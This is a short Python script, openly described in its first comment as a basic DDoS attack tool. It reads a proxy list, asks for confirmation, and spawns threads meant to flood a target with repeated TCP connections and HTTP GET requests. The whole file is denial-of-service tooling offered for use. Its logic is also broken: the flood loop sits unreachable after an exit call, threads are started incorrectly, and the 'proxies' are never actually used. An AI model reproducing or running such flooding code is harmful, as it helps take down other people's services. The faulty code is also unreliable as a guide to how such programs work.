# Import all modules necessary to make a basic ddos attack
import socket
import threading
import os
import time
from termcolor import colored

attack_count = 0


def wait(secs):
    time.sleep(secs)


def start_attack(target, proxy_file, threads):
    # Ask User one last time if he would like to start attack
    print()
    print(colored('-----------------------------------------------------------------', 'blue'))
    print(colored('Would you like to start the DDoS-Attack? (y/n)', 'blue'))
    choice = input()
    if choice == 'y':
        for i in range(threads):
            thread = threading.Thread(target=ddos(target, proxy_file))
            thread.start()
    else:
        print(colored('Program exiting...', 'red'))
        time.sleep(1)
        exit()


def ddos(target, proxy_file):
    proxies = []
    proxies_ips = []
    proxies_ports = []
    print(colored('Checking Proxy File...', 'blue'))
    wait(1)
    proxy_file = str(proxy_file)
    if os.path.isfile(proxy_file):
        print(colored('Success: File exists', 'green'))
        wait(1)
        proxy_f = open(proxy_file, 'r')
        print(colored('Loading Proxies...', 'blue'))
        wait(3)
        lines = proxy_f.readlines()
        for line in lines:
            proxy_parts = line.split(":")
            proxies_ips.append(proxy_parts[0])
            proxies_ports.append(proxy_parts[1])
            proxies.append(line)
        print(colored('Finished loading proxies, will continue with script!', 'green'))
        wait(1)
    else:
        print(colored("Please re-check your file. It doesn't exist.", 'red'))
        exit(0)

        print(colored('WARNING: Your PC will lag during this attack no matter what Hardware you use (tested).', 'yellow'))
        while True:
            for combo in proxies:
                try:
                    parts_combo = combo.split(":")
                    ip = parts_combo[0]
                    port_own = parts_combo[1]
                    global attack_count
                    attack_count += 1
                    print('')
                    print(colored('[N] Request Number: '+str(attack_count), 'yellow'))
                    print(colored('[*] Sending GET Request with '+ip+" on port "+port_own, 'blue'))
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    # Connect to target via port
                    client.connect((str(target), int(port_own)))
                    # Send GET request to target
                    client.sendto(("GET / "+str(target)+" HTTP/1.1\r\n").encode('ascii'), (str(target), int(port_own)))
                    client.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (str(target), int(port_own)))
                    print(colored('[+] Successfully sent.', 'green'))
                    client.close()
                except ConnectionRefusedError:
                    print(colored('[-] Request was not sent sent.', 'red'))
                    continue
